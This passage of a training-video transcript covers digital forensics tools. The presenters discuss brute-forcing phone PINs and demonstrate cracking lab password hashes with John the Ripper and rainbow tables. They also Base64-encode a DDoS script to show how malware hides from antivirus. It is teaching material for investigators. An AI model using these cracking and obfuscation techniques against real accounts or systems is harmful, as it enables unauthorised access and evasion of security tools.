chips\n\n251\n00:13:02.514 --> 00:13:04.342\nand all the software involved as well.\n\n252\n00:13:04.342 --> 00:13:07.530\nSo expertise level is a little bit higher.\n\n253\n00:13:07.530 --> 00:13:10.135\nThen, if you're doing\nsomething like a hex dump or\n\n254\n00:13:10.135 --> 00:13:12.448\njust a regular grab with\nsomething like FTK.\n\n255\n00:13:12.448 --> 00:13:14.900\nSo just be aware of that.\n\n256\n00:13:14.900 --> 00:13:16.739\nAnything else?\nHigh level of expertise,\n\n257\n00:13:16.739 --> 00:13:21.450\nit's basically just reading\nthe information that's on that chip.\n\n258\n00:13:21.450 --> 00:13:24.043\nThey don't have spinning hard\ndrives inside of them, or\n\n259\n00:13:24.043 --> 00:13:27.297\nat least most of them don't,\nwe're talking phones here and tablets.\n\n260\n00:13:27.297 --> 00:13:29.850\nSo you're gonna have to read\noff the memory modules.\n\n261\n00:13:29.850 --> 00:13:33.180\nYou have to grab those modules,\npull them out, attach, do your thing.\n\n262\n00:13:33.180 --> 00:13:37.860\nThen there's micro read which is\nthe highest level of expertise.\n\n263\n00:13:37.860 --> 00:13:43.473\nVery similar to the chip off but this is\nwhere you actually instead of connecting\n\n264\n00:13:43.473 --> 00:13:49.026\nit to a device where there could be\nmishandling of the chip server, whatever.\n\n265\n00:13:49.026 --> 00:13:50.480\nSame kind of thing that could apply here.\n\n266\n00:13:50.480 --> 00:13:53.467\nBut what we're doing is we're gonna take\nan electron microscope, look down at\n\n267\n00:13:53.467 --> 00:13:56.290\nthe logic gates are on the chip and\nsee what configuration that they are in.\n\n268\n00:13:56.290 --> 00:13:59.350\n&gt;&gt; [LAUGH]\n&gt;&gt; Hitting those binary ones and zeros.\n\n269\n00:13:59.350 --> 00:14:04.149\nAnd then recompiling that into\nactual data, as you might expect,\n\n270\n00:14:04.149 --> 00:14:07.740\nthis takes a super high\nlevel of expertise.\n\n271\n00:14:07.740 --> 00:14:10.899\n&gt;&gt; Yeah, not something we're gonna do\non the average incident, most likely.\n\n272\n00:14:10.899 --> 00:14:13.083\n&gt;&gt; No, also kind of expensive.\n\n273\n00:14:13.083 --> 00:14:14.908\n&gt;&gt; Yeah.\n&gt;&gt; I don't know if you've priced electron\n\n274\n00:14:14.908 --> 00:14:15.955\nmicroscopes lately.\n\n275\n00:14:15.955 --> 00:14:18.337\n&gt;&gt; [LAUGH] A few years ago,\nI was looking into getting one but-\n\n276\n00:14:18.337 --> 00:14:19.715\n&gt;&gt; Yeah, what would you find, Mike?\n\n277\n00:14:19.715 --> 00:14:20.291\n&gt;&gt; Not recently.\n\n278\n00:14:20.291 --> 00:14:21.690\nWell, out of my price range.\n\n279\n00:14:21.690 --> 00:14:23.331\n[LAUGH]\n&gt;&gt; Yeah, most of our price ranges,\n\n280\n00:14:23.331 --> 00:14:25.105\nI'm gonna be honest with you.\n\n281\n00:14:25.105 --> 00:14:25.608\nAnd I'll leave that to you.\n\n282\n00:14:25.608 --> 00:14:28.135\nGo out there and do that Google search,\nthat's a fun one to go.\n\n283\n00:14:28.135 --> 00:14:29.702\nLet's buy an electron microscope.\n\n284\n00:14:29.702 --> 00:14:34.000\nWow, that's expensive,\nso interesting stuff.\n\n285\n00:14:34.000 --> 00:14:36.033\nThere are devices,\nwe talked about these really commonly.\n\n286\n00:14:36.033 --> 00:14:40.810\nThey use a device called a Gray Key\nwhich you connect to a mobile device and\n\n287\n00:14:40.810 --> 00:14:44.690\nit's able to basically brute\nforce the PIN code, right?\n\n288\n00:14:44.690 --> 00:14:48.732\nSo up to six digits, which is impressive\nand it only takes it a few days to do\n\n289\n00:14:48.732 --> 00:14:51.882\nthat, like two or\nthree days to hit up to a six digit code.\n\n290\n00:14:51.882 --> 00:14:52.629\n&gt;&gt; Wow.\n\n291\n00:14:52.629 --> 00:14:56.100\n&gt;&gt; I can do a four digit code in minutes.\n\n292\n00:14:56.100 --> 00:15:00.942\nSo plug the device in, it runs against\nthe basically slamming it with four digit\n\n293\n00:15:00.942 --> 00:15:04.935\ncodes until it finds the right\ncombination unlocking the phone.\n\n294\n00:15:04.935 --> 00:15:06.730\nThat was one capability.\n\n295\n00:15:06.730 --> 00:15:10.909\nThe other one I saw was secure\nview which had a robot.\n\n296\n00:15:10.909 --> 00:15:12.132\n&gt;&gt; Really?\n&gt;&gt; You put the phone in,\n\n297\n00:15:12.132 --> 00:15:12.837\nit's got a camera.\n\n298\n00:15:12.837 --> 00:15:17.590\nYou line it up and the robot just sits\nthere and tries different combos.\n\n299\n00:15:17.590 --> 00:15:18.298\n&gt;&gt; Interesting.\n&gt;&gt; Yeah, so\n\n300\n00:15:18.298 --> 00:15:20.960\nthere are a couple different ways\nin which you can employ this.\n\n301\n00:15:20.960 --> 00:15:23.740\nIf you're technically savvy,\nas far as electronical engineering goes,\n\n302\n00:15:23.740 --> 00:15:26.091\nyou could create your own robot\nthat does the exact same thing.\n\n303\n00:15:26.091 --> 00:15:28.606\nOr you could buy theirs,\nwhich is probably a little easier.\n\n304\n00:15:28.606 --> 00:15:30.113\n&gt;&gt; [LAUGH]\n&gt;&gt; A lot of law enforcement that\n\n305\n00:15:30.113 --> 00:15:30.690\ndoes that.\n\n306\n00:15:30.690 --> 00:15:32.745\nI'll put a link to that in the show\nnotes so you can go check that out,\n\n307\n00:15:32.745 --> 00:15:33.553\nit's really cool stuff.\n\n308\n00:15:33.553 --> 00:15:34.640\n&gt;&gt; Nice.\n\n309\n00:15:34.640 --> 00:15:36.945\n&gt;&gt; All right,\nlet's move on to password cracking.\n\n310\n00:15:36.945 --> 00:15:40.330\nYeah, I know I'm trying to kinda\nget through past everything here.\n\n311\n00:15:40.330 --> 00:15:43.606\nPassword cracking, important part,\nlet's look at password crackness.\n\n312\n00:15:43.606 --> 00:15:45.020\nJump into my computer here.\n\n313\n00:15:45.020 --> 00:15:49.017\nLet me close old HTop,\nI'm gonna quit out of there, clear.\n\n314\n00:15:49.017 --> 00:15:51.887\nAnd I've got some password\nfiles that I can show you.\n\n315\n00:15:51.887 --> 00:15:55.586\nJohn the Ripper is probably the most\nfamous password cracker on the market.\n\n316\n00:15:55.586 --> 00:15:57.722\nIt's been around for a long time and\nstill does a great job.\n\n317\n00:15:57.722 --> 00:16:00.798\nCracks all different types\nof passwords Word files,\n\n318\n00:16:00.798 --> 00:16:03.884\nPDFs, they've got encryptions\nyou can put on them.\n\n319\n00:16:03.884 --> 00:16:07.920\nAn attacker may have left some evidence\nbehind but thrown on a password.\n\n320\n00:16:07.920 --> 00:16:09.400\nHow do we get past that?\n\n321\n00:16:09.400 --> 00:16:11.250\nPassword cracker,\nthis is gonna help us out.\n\n322\n00:16:11.250 --> 00:16:12.770\nSo we can decrypt this stuff.\n\n323\n00:16:14.050 --> 00:16:16.210\nSo let me show you John the Ripper here.\n\n324\n00:16:16.210 --> 00:16:20.590\nSo I just do John, you'll see\nthe different capabilities that it has,\n\n325\n00:16:20.590 --> 00:16:22.130\nand you can throw some\nof these things at it.\n\n326\n00:16:22.130 --> 00:16:23.370\nBut for the most part,\n\n327\n00:16:23.370 --> 00:16:28.040\na lot of times you're just saying, here's\nmy password file, please crack that.\n\n328\n00:16:28.040 --> 00:16:29.560\nI've got one available here.\n\n329\n00:16:29.560 --> 00:16:32.470\nI think it is, I keep incrementing.\n\n330\n00:16:32.470 --> 00:16:35.150\nYou'll see password and pass 2, pass 3.\n\n331\n00:16:35.150 --> 00:16:36.480\nSo I'll copy pass 3.\n\n332\n00:16:36.480 --> 00:16:43.867\nPass 3, that's fine, pass 2,\nand we'll call it pass4.txt.\n\n333\n00:16:43.867 --> 00:16:45.968\nAnd I'll cat pass4.\n\n334\n00:16:45.968 --> 00:16:49.118\nCat pass4.\n\n335\n00:16:49.118 --> 00:16:50.062\nThere we go.\n\n336\n00:16:50.062 --> 00:16:55.050\nAnd you'll see that it's just\na credentials, you got your username and\n\n337\n00:16:55.050 --> 00:16:57.520\nthen the encrypted password here.\n\n338\n00:16:57.520 --> 00:17:01.570\nSo this format is taking off\nof a Unix system, right?\n\n339\n00:17:01.570 --> 00:17:06.257\nSo if I just do John and\nthen give it pass4,\n\n340\n00:17:06.257 --> 00:17:10.670\npass4.txt, let it fire away.\n\n341\n00:17:10.670 --> 00:17:12.910\nWarning, it detected\nthe type was md5crypt, but\n\n342\n00:17:12.910 --> 00:17:15.710\nthe string was also recognised as x,\nit's giving me some information.\n\n343\n00:17:16.800 --> 00:17:19.970\nOption to brute force,\nloading these type identified, so\n\n344\n00:17:19.970 --> 00:17:24.190\nloaded one password hash and\nno passwords left to crack.\n\n345\n00:17:24.190 --> 00:17:30.859\nOnce it's cracked, I can say password,\nI'm sorry, John and then do --show.\n\n346\n00:17:32.140 --> 00:17:33.060\nPassword files required.\n\n347\n00:17:33.060 --> 00:17:33.570\nSorry.\n\n348\n00:17:33.570 --> 00:17:38.140\nWe're gonna do the p-a-s-s 4.text, -show.\n\n349\n00:17:38.140 --> 00:17:41.770\nAnd then it shows me\nthe password is victim4.\n\n350\n00:17:41.770 --> 00:17:45.170\nWe have victim, and\nthe password is victim4, right.\n\n351\n00:17:45.170 --> 00:17:48.190\nSo I was able to crack\nthat fairly quickly.\n\n352\n00:17:48.190 --> 00:17:50.739\nYou can do either brute force or\ndictionary attacks.\n\n353\n00:17:51.760 --> 00:17:53.810\nBrute force is gonna take\nyou a little while longer.\n\n354\n00:17:53.810 --> 00:17:57.470\nDictionary could miss a password,\n\n355\n00:17:57.470 --> 00:17:59.940\nso you might wanna use one\nof the other depending.\n\n356\n00:17:59.940 --> 00:18:01.580\nI'd probably use both\nto be honest with you.\n\n357\n00:18:02.840 --> 00:18:06.090\nLet's also take a look at,\nI call it oath cracked, but\n\n358\n00:18:06.090 --> 00:18:10.413\nit might be auth cracked because it's\nkind of a harking to L0phtCrack.\n\n359\n00:18:10.413 --> 00:18:12.689\n&gt;&gt; Right.\n&gt;&gt; Which was the original Windows password\n\n360\n00:18:12.689 --> 00:18:13.200\ncracker.\n\n361\n00:18:13.200 --> 00:18:16.000\nYou can also run it in Unix systems or\nLinux systems.\n\n362\n00:18:16.000 --> 00:18:19.667\nLet me do that,\nlet me go into Applications,\n\n363\n00:18:19.667 --> 00:18:24.151\ngo to passwords attacks, and\nthere it is right there.\n\n364\n00:18:24.151 --> 00:18:28.440\nIf I can click and\nnot drag when I do that, there you go.\n\n365\n00:18:28.440 --> 00:18:30.960\nAnd all you have to do\nis go into these tables,\n\n366\n00:18:30.960 --> 00:18:34.070\nyou'll notice I've got this XP3 fast.\n\n367\n00:18:34.070 --> 00:18:36.370\nYou go to their website, they'll have\nall the different tables available,\n\n368\n00:18:36.370 --> 00:18:38.840\nup to quite a few terabytes of data.\n\n369\n00:18:38.840 --> 00:18:41.060\nSo I just downloaded one that would work.\n\n370\n00:18:41.060 --> 00:18:44.445\nI did wanna show you guys a website\nthat's also kind of cool,\n\n371\n00:18:44.445 --> 00:18:46.390\nwe'll help you play around with this.\n\n372\n00:18:46.390 --> 00:18:49.560\nOnce you get those tables you can\nthen browse them directly and\n\n373\n00:18:49.560 --> 00:18:50.930\nit will install them.\n\n374\n00:18:50.930 --> 00:18:53.010\nIt doesn't come with\nany tables to install.\n\n375\n00:18:53.010 --> 00:18:57.620\nIf you come over here, I found this\nwebsite which allows you to create NTLM or\n\n376\n00:18:57.620 --> 00:19:00.680\nNT or LM hashes, which is really cool.\n\n377\n00:19:00.680 --> 00:19:07.648\nSo I come over here and\nI can say my password is mikerodrick.\n\n378\n00:19:07.648 --> 00:19:08.930\nThat's what I want it to be.\n\n379\n00:19:08.930 --> 00:19:11.380\nNot generate password, I'm sorry.\n\n380\n00:19:12.610 --> 00:19:13.381\nWipe that out.\n\n381\n00:19:17.168 --> 00:19:18.090\nAnd make it something easy.\n\n382\n00:19:18.090 --> 00:19:20.540\nWe'll just call it password1 like that,\n\n383\n00:19:20.540 --> 00:19:23.660\nand it calculated hashes and\nthen there's the hash.\n\n384\n00:19:23.660 --> 00:19:26.652\nAnd then down below,\nit does this PW dump format.\n\n385\n00:19:26.652 --> 00:19:30.360\nSo this is how it would look if you\ndid a PW dump which is a tool for\n\n386\n00:19:30.360 --> 00:19:35.790\ngathering passwords out of the memory\ninside of Windows systems.\n\n387\n00:19:35.790 --> 00:19:36.710\nSo you can play with this.\n\n388\n00:19:36.710 --> 00:19:37.540\nYou can create your own dumps.\n\n389\n00:19:37.540 --> 00:19:40.714\nYou don't have to do a PW dump on\na system, you can create anything\n\n390\n00:19:40.714 --> 00:19:44.720\nyou want and test them using authcracker\nor [INAUDIBLE], whatever it is.\n\n391\n00:19:44.720 --> 00:19:49.260\nI change this, cuz that's a username\nfield, not the password field.\n\n392\n00:19:49.260 --> 00:19:56.850\nBut I've already got one over here,\nand it is, what was it?\n\n393\n00:19:56.850 --> 00:20:02.560\nI think it was maybe just passfile or\npassword, maybe password.\n\n394\n00:20:02.560 --> 00:20:09.150\nLet me cat That was a full pull\nhere from a VM I was looking at.\n\n395\n00:20:09.150 --> 00:20:13.440\nNow, that's cat password.txt.\n\n396\n00:20:13.440 --> 00:20:15.885\nWell, that's part of one, cat passfile.\n\n397\n00:20:15.885 --> 00:20:17.750\n&gt;&gt; [LAUGH]\n&gt;&gt; I know, I've messed around with this so\n\n398\n00:20:17.750 --> 00:20:19.710\nmuch, the same kind of thing.\n\n399\n00:20:19.710 --> 00:20:23.910\nAnyway, I can create one really quickly,\nlet's do that.\n\n400\n00:20:23.910 --> 00:20:27.460\nLet's call this one,\nlet's change this one,\n\n401\n00:20:27.460 --> 00:20:33.730\nI get starwars will be our password,\ncalculate the hash.\n\n402\n00:20:33.730 --> 00:20:40.739\nChange this to Luke is the user and\ngrab that, we'll grab the whole thing.\n\n403\n00:20:42.579 --> 00:20:43.236\nCopy.\n\n404\n00:20:44.820 --> 00:20:47.620\nThrow that into file.\n\n405\n00:20:47.620 --> 00:20:52.815\nWe will nano, and\nwe'll call it passgrab.txt,\n\n406\n00:20:52.815 --> 00:20:59.540\nhow about, and we'll paste that\ninto there, save it, exit.\n\n407\n00:20:59.540 --> 00:21:01.780\nAnd now we will run it\nagainst authcracked.\n\n408\n00:21:01.780 --> 00:21:03.130\nWhere are you?\n\n409\n00:21:03.130 --> 00:21:04.100\nBring it up.\n\n410\n00:21:04.100 --> 00:21:09.580\nWe will load a single hash, which\ncomes from that, which I guess I could\n\n411\n00:21:09.580 --> 00:21:16.760\nthrow in here as well, paste that in,\nhit OK, now hit Crack.\n\n412\n00:21:16.760 --> 00:21:18.570\nAnd it's starting to load up,\nit's running,\n\n413\n00:21:18.570 --> 00:21:21.750\nit's checking it, trying to do its thing.\n\n414\n00:21:21.750 --> 00:21:25.300\nThis is actually a brute force attack,\nthis is not a dictionary attack.\n\n415\n00:21:25.300 --> 00:21:30.780\nHopefully it's able to brute force that,\nwhich says not found, but that's the idea.\n\n416\n00:21:30.780 --> 00:21:33.970\nSo I just picked up password that wasn't\nable to brute force with those tables.\n\n417\n00:21:33.970 --> 00:21:37.890\nI've tried another table, maybe that set\nwill give me a little better information.\n\n418\n00:21:37.890 --> 00:21:40.400\nBut there you go, that's the idea, right?\n\n419\n00:21:40.400 --> 00:21:42.550\nAll right, moving on,\nwe're almost done here.\n\n420\n00:21:42.550 --> 00:21:47.000\nDecoding tools, cryptography tools,\nvery interesting stuff.\n\n421\n00:21:47.000 --> 00:21:51.530\nA lot of times, malware will encrypt\nitself in some way, shape or\n\n422\n00:21:51.530 --> 00:21:55.180\nform typically using Base64 encoding so\n\n423\n00:21:55.180 --> 00:21:58.850\nthat it's undetectable\nby antivirus systems.\n\n424\n00:21:58.850 --> 00:22:03.340\nSo it's sees just a bunch of garbled mess\ninstead of the actual code that it is.\n\n425\n00:22:03.340 --> 00:22:05.900\nWe had that DDoS, if I cap that ddos.sh,\n\n426\n00:22:05.900 --> 00:22:11.460\nremember it's our flood utility that\nwe wrote for doing a DDoS attack.\n\n427\n00:22:11.460 --> 00:22:12.510\nHow about that?\n\n428\n00:22:12.510 --> 00:22:16.835\nWell, what if I were to encrypt that file,\nright?\n\n429\n00:22:16.835 --> 00:22:19.041\nWould I be able to do that?\n\n430\n00:22:19.041 --> 00:22:24.332\nSo what I could do is I can say,\nlet me see,\n\n431\n00:22:24.332 --> 00:22:28.584\nBase64 and then say ddos.sh.\n\n432\n00:22:28.584 --> 00:22:33.720\nAnd there is the Base64 encoded code.\n\n433\n00:22:33.720 --> 00:22:39.600\nI can put that in there and as my malware,\nit would be able to reach into that,\n\n434\n00:22:39.600 --> 00:22:43.680\ndecode that, run the code and\nkeep it safe on the drive.\n\n435\n00:22:43.680 --> 00:22:47.485\nSo if the malware itself got detected,\nit could then do reinstallation,\n\n436\n00:22:47.485 --> 00:22:51.570\nmaybe it runs reinstallation every so\noften, grabs this code, reruns it, right?\n\n437\n00:22:51.570 --> 00:22:56.290\nSo if you find something that\nlooks like this, to decode it,\n\n438\n00:22:56.290 --> 00:22:58.580\nI could grab this, say copy that.\n\n439\n00:23:00.000 --> 00:23:05.400\nSometimes I just do this and say,\necho that out and then there it is.\n\n440\n00:23:05.400 --> 00:23:14.772\nI pipe that into base64 -d,\nand there you go.\n\n441\n00:23:14.772 --> 00:23:21.592\nNow it unencrypts it, so you've got to\nbe able to work with things like Base64.\n\n442\n00:23:21.592 --> 00:23:24.010\nThere's also graphical\nversions of this stuff.\n\n443\n00:23:24.010 --> 00:23:28.790\nIf you look at my ESR here,\nright in here I got encryption and\n\n444\n00:23:28.790 --> 00:23:30.900\nencoding, Base64 encode and decode.\n\n445\n00:23:30.900 --> 00:23:34.350\nAnd that's just a toolbar I\ninstalled on my browser, right?\n\n446\n00:23:34.350 --> 00:23:35.910\nSo there are many different\nways which you can do that.\n\n447\n00:23:35.910 --> 00:23:39.020\nThere's website you can go to,\ndo the exact same thing.\n\n448\n00:23:39.020 --> 00:23:41.150\nSo be prepared,\na lot of times they call those,\n\n449\n00:23:41.150 --> 00:23:44.850\nI wanna make sure I use the term packers,\nright?\n\n450\n00:23:44.850 --> 00:23:49.900\nSo they're packing the data\ninto an encryption algorithm so\n\n451\n00:23:49.900 --> 00:23:52.220\nit's not as easily detected, right?\n\n452\n00:23:52.220 --> 00:23:54.050\nSo that's what's called a packer.\n\n453\n00:23:54.050 --> 00:23:56.341\nA lot of times it will do that.\n\n454\n00:23:56.341 --> 00:23:59.827\nOkay, now we're almost done,\nwe got one more thing to talk\n\n455\n00:23:59.827 --> 00:24:03.753\nabout which are log viewers,\nwhich we have discussed ad nauseam.\n\n456\n00:24:03.753 --> 00:24:05.390\n[LAUGH]\n&gt;&gt; Let me come back here.\n\n457\n00:24:05.390 --> 00:24:07.167\nI'll just clear a screen.\n\n458\n00:24:07.167 --> 00:24:08.281\nSyslog, right?\n\n459\n00:24:08.281 --> 00:24:13.240\nIf we go c /var/log, you got the syslog,\nthere it is right there,\n\n460\n00:24:13.240 --> 00:24:16.546\nand if there's any other\ndata on the syslog,\n\n461\n00:24:16.546 --> 00:24:20.381\nyou can check all the log\nfiles that it's creating.\n\n462\n00:24:20.381 --> 00:24:21.000\nThey're right there.\n\n463\n00:24:21.000 --> 00:24:25.092\nDon't forget we could setup multiple\ndevices to basically phone home their\n\n464\n00:24:25.092 --> 00:24:29.540\nsyslog messages to a centralized\nlog server, check those logs,\n\n465\n00:24:29.540 --> 00:24:33.080\nlook for source of destination,\nports, anything,\n\n466\n00:24:33.080 --> 00:24:38.165\nalerts, failures, successes,\nall that other great stuff can go there.\n\n467\n00:24:38.165 --> 00:24:40.540\nThird party application data is in there.\n\n468\n00:24:40.540 --> 00:24:44.700\nYou go into your Windows system and\nyou can look in the event viewer, so\n\n469\n00:24:44.700 --> 00:24:47.280\nif we Event Viewer, bring that up.\n\n470\n00:24:47.280 --> 00:24:51.753\nDon't forget to look inside of there,\ncheck those Windows logs for\n\n471\n00:24:51.753 --> 00:24:54.196\napplication, security problems.\n\n472\n00:24:54.196 --> 00:24:55.288\nLook for any errors there.\n\n473\n00:24:55.288 --> 00:24:58.830\nPeople then trying to hammer\naway at a service of some sort,\n\n474\n00:24:58.830 --> 00:25:01.162\nseeing that audit success.\n\n475\n00:25:01.162 --> 00:25:02.920\nYou want audit successes and failures,\n\n476\n00:25:02.920 --> 00:25:06.665\nbecause maybe after X amount of\nfailures there was a success.\n\n477\n00:25:06.665 --> 00:25:08.388\nThat could be a problem.\n\n478\n00:25:08.388 --> 00:25:11.180\nAlso packets, captures as well.\n\n479\n00:25:11.180 --> 00:25:12.540\nThose can be a type of log.\n\n480\n00:25:12.540 --> 00:25:16.082\nand that brings us full circle\nback to our rhino hunts,\n\n481\n00:25:16.082 --> 00:25:19.778\ncuz I wanted to show you something\nreally cool that I had to\n\n482\n00:25:19.778 --> 00:25:24.096\ndo [COUGH] that involve the packet\ncapture logs from the rhino hunt.\n\n483\n00:25:24.096 --> 00:25:26.640\n&gt;&gt; Yeah.\n&gt;&gt; So I'm gonna go back to our Linux\n\n484\n00:25:26.640 --> 00:25:31.900\nsystem here, and I'm gonna clear this out,\nand I'm gonna home.\n\n485\n00:25:31.900 --> 00:25:36.986\nI am going to cd into RHINO2, and\nremember there were these logs,\n\n486\n00:25:36.986 --> 00:25:40.360\nrhino2.log, rhino3.log, and rhino.log,\n\n487\n00:25:40.360 --> 00:25:44.940\nand when I looked at the data I realized\nthese were network captures from TCP dump.\n\n488\n00:25:44.940 --> 00:25:48.240\nOf course, I'm like, great,\nI can open that up inside of Wireshark,\n\n489\n00:25:48.240 --> 00:25:52.020\nget that better graphical experience for\nthe end user.\n\n490\n00:25:52.020 --> 00:25:54.590\nSo, I'm gonna do that,\nI'm gonna fire up Wireshark.\n\n491\n00:25:55.801 --> 00:26:00.470\nThere we go, and Wireshark.\n\n492\n00:26:00.470 --> 00:26:01.784\nLet that come up.\n\n493\n00:26:01.784 --> 00:26:05.670\nJust take a second, and then I'm just\ngonna open as you would any other file.\n\n494\n00:26:05.670 --> 00:26:12.076\nSo instead of telling it to look at my\nnetwork card I'm gonna say File &gt; Open.\n\n495\n00:26:12.076 --> 00:26:16.540\nFile &gt; Open, go to not there anymore.\n\n496\n00:26:16.540 --> 00:26:17.789\nWe're doing Rhino2.\n\n497\n00:26:18.880 --> 00:26:22.334\nRedoing this, I'll do rhino.log and\nhit Open, and then in here,\n\n498\n00:26:22.334 --> 00:26:25.786\nI can look at the data, see what\nkind of connections have been made,\n\n499\n00:26:25.786 --> 00:26:29.789\nall the stuff that we've been talking\nabout before, and interesting through\n\n500\n00:26:29.789 --> 00:26:33.907\nhere, I noticed as I sifted through this\ndata, I saw, let me scroll, I know I'm\n\n501\n00:26:33.907 --> 00:26:36.982\ngiving everybody a seizure right now, but-\n&gt;&gt; [LAUGH]\n\n502\n00:26:36.982 --> 00:26:38.946\n&gt;&gt; It's a little flickery,\n\n503\n00:26:38.946 --> 00:26:40.915\nbut take me just a second.\n\n504\n00:26:40.915 --> 00:26:41.930\nLet me scroll down.\n\n505\n00:26:42.990 --> 00:26:45.980\nThere we go.\nI noticed that I saw Tilnet information.\n\n506\n00:26:47.130 --> 00:26:51.850\n&gt;&gt; Right, and I can right-click,\nfollow that TCP stream and\n\n507\n00:26:51.850 --> 00:26:55.550\nI look, the login,\nremember, the user gnome?\n\n508\n00:26:55.550 --> 00:26:58.570\nThe guy Jeremy had given\nthem the credentials?\n\n509\n00:26:58.570 --> 00:27:04.119\nAnd now I can look at this conversation\nand see there were golden.jpg, and\n\n510\n00:27:04.119 --> 00:27:09.689\ncshrc.user, all these different files,\nand things that were going on.\n\n511\n00:27:09.689 --> 00:27:16.360\nIt looks like they were du-k, and just\nlooking at the information on the machine.\n\n512\n00:27:16.360 --> 00:27:21.919\nI tried to change the password for\nthat user, which they were unable to do,\n\n513\n00:27:21.919 --> 00:27:27.124\nwhich they talked about inside of\nthe diary that we had found, right,\n\n514\n00:27:27.124 --> 00:27:31.978\ninteresting stuff, but\nalso after that I saw that some FTP data,\n\n515\n00:27:31.978 --> 00:27:35.276\nwhich was interesting, there it is, FTP.\n\n516\n00:27:35.276 --> 00:27:39.847\nSo I saw this, and\nas I looked at it I realized\n\n517\n00:27:39.847 --> 00:27:44.306\nthere was a transfer of data, there it is.\n\n518\n00:27:44.306 --> 00:27:48.460\nLet me go at the first transfer of that,\nlet me go back up, almost there.\n\n519\n00:27:48.460 --> 00:27:49.810\nIt was right after the section.\n\n520\n00:27:49.810 --> 00:27:52.020\nI think that's it, I think we're there.\n\n521\n00:27:53.650 --> 00:27:59.934\nI noticed it said, STOR,\nlet me zoom in, rhino3.jpg,\n\n522\n00:27:59.934 --> 00:28:06.040\nso it uploaded a Rhino pic and\nset it to the server.\n\n523\n00:28:06.040 --> 00:28:10.430\nGuess what I can do because\nI have that in the capture?\n\n524\n00:28:10.430 --> 00:28:12.405\nI can recreate the data.\n\n525\n00:28:12.405 --> 00:28:15.749\nYeah, so what we got to do is,\nthere was the request, but\n\n526\n00:28:15.749 --> 00:28:18.627\nhere was the actual transfer\nof data right here.\n\n527\n00:28:18.627 --> 00:28:20.335\nWe see 1460 bytes.\n\n528\n00:28:20.335 --> 00:28:23.485\nThere's the beginning of the transfer,\nthe transfer has been completed.\n\n529\n00:28:23.485 --> 00:28:24.940\nThere's the second part of it.\n\n530\n00:28:24.940 --> 00:28:28.621\nSo if I right-click, follow the stream,\n\n531\n00:28:28.621 --> 00:28:33.529\nbring up this information, and\nnow if I come down here and\n\n532\n00:28:33.529 --> 00:28:37.942\nsay, show and save data as,\nchange it to Hex Dump.\n\n533\n00:28:37.942 --> 00:28:41.330\nI wanna show you a really interesting\nthing that you guys need to know about.\n\n534\n00:28:41.330 --> 00:28:42.732\nIt's called a magic number.\n\n535\n00:28:42.732 --> 00:28:46.779\nI have a lot of files to indicate to\nthe system what type of file they are,\n\n536\n00:28:46.779 --> 00:28:50.292\nthey will be [INAUDIBLE] using\nwhat's known as a magic number.\n\n537\n00:28:50.292 --> 00:28:52.690\nSo, this would be percent.pdf,\nwhere you know it's a PDF.\n\n538\n00:28:52.690 --> 00:28:57.160\nThis could be, well,\nin this case it is ff d8,\n\n539\n00:28:58.480 --> 00:29:03.090\nf, any file that starts with ff d8 and\nends with ff d9, which if\n\n540\n00:29:03.090 --> 00:29:07.710\nwe looked at the very bottom we would\nsee that, plus it's a JPEG image right?\n\n541\n00:29:07.710 --> 00:29:13.096\nSo you see that right there,\nand now if I come,\n\n542\n00:29:13.096 --> 00:29:17.654\nand I change this to Raw, right there,\n\n543\n00:29:17.654 --> 00:29:22.488\nyou'll notice ff d8 still up there, and\n\n544\n00:29:22.488 --> 00:29:27.735\nI say Save as, and\nI say it is crazy rhino pic,\n\n545\n00:29:27.735 --> 00:29:36.052\nrhino, just because I don't want to\nstomp up a line .jpg, I hit Save.\n\n546\n00:29:36.052 --> 00:29:40.730\nNow if I open up my file explorer,\nlet me get this out of the way.\n\n547\n00:29:40.730 --> 00:29:48.080\nGo to my file explorer, or just do # ls,\nyou'll see, crazy, where did it go?\n\n548\n00:29:48.080 --> 00:29:50.895\nI must have saved it somewhere else.\n\n549\n00:29:50.895 --> 00:29:55.002\nI must have put it in this RHINO folder,\ncuz that's where I was previously.\n\n550\n00:29:55.002 --> 00:30:02.352\n[INAUDIBLE]\nLocate\n\n551\n00:30:02.352 --> 00:30:10.684\ncrazyrhino.jpg.\n\n552\n00:30:10.684 --> 00:30:11.921\nIt was unable to find it,\nmaybe I didn't save it.\n\n553\n00:30:11.921 --> 00:30:13.558\nLet's go back,\nwe'll do it right this time.\n\n554\n00:30:13.558 --> 00:30:14.505\nCome on, Lowrie.\n&gt;&gt; [LAUGH]\n\n555\n00:30:14.505 --> 00:30:15.604\n&gt;&gt; Tighten up.\n\n556\n00:30:15.604 --> 00:30:16.608\nBring it up.\n\n557\n00:30:16.608 --> 00:30:18.960\nGo to Follow &gt; TCP Stream.\n\n558\n00:30:18.960 --> 00:30:23.590\nChange this to x, we see that we\nhave the right thing, excellent.\n\n559\n00:30:23.590 --> 00:30:28.230\nThen to Raw, Save as, where are you\nsaving, there it is right there.\n\n560\n00:30:28.230 --> 00:30:28.780\nIt is in rhino2.\n\n561\n00:30:28.780 --> 00:30:29.775\nThat's, that was the problem.\n\n562\n00:30:29.775 --> 00:30:31.890\nOkay, so we do have it, excellent.\n\n563\n00:30:31.890 --> 00:30:33.439\nI just didn't find it.\n\n564\n00:30:33.439 --> 00:30:38.469\nAll right, so now we can open that\nup through the File Explorer,\n\n565\n00:30:38.469 --> 00:30:43.221\nopen up rhino2, should be a rhino,\ncrazyrhino.jpg, and\n\n566\n00:30:43.221 --> 00:30:46.129\nnow we found another rhinoceroses.\n\n567\n00:30:46.129 --> 00:30:49.669\nIf you look at through the other\ndumpsters, similar things are happening\n\n568\n00:30:49.669 --> 00:30:53.650\nthere, get the rest of the pictures, but\nI was able to recreate that from the log.\n\n569\n00:30:53.650 --> 00:30:56.375\nSo, when you think something is happening,\n\n570\n00:30:56.375 --> 00:31:00.748\na good idea is to start a capture of\nyour network data to help make sure that\n\n571\n00:31:00.748 --> 00:31:04.062\nyou get everything and\nnot just what's on the system.\n\n572\n00:31:04.062 --> 00:31:07.886\nMaybe what the system is communicating\nout throughout your network.\n\n573\n00:31:07.886 --> 00:31:14.266\nI think that's about all we've got for\nutilities and forensic suites.\n\n574\n00:31:14.266 --> 00:31:18.281\n&gt;&gt; All right, Daniel, well, great\ndemonstrations and great explanations as\n\n575\n00:31:18.281 --> 00:31:22.438\nwe walk through a myriad of suites and\nutilities that we have at our fingertips.\n\n576\n00:31:22.438 --> 00:31:23.280\nSo we appreciate that.\n\n577\n00:31:23.280 --> 00:31:25.658\nHope everybody out there\nenjoyed watching this one.\n\n578\n00:31:25.658 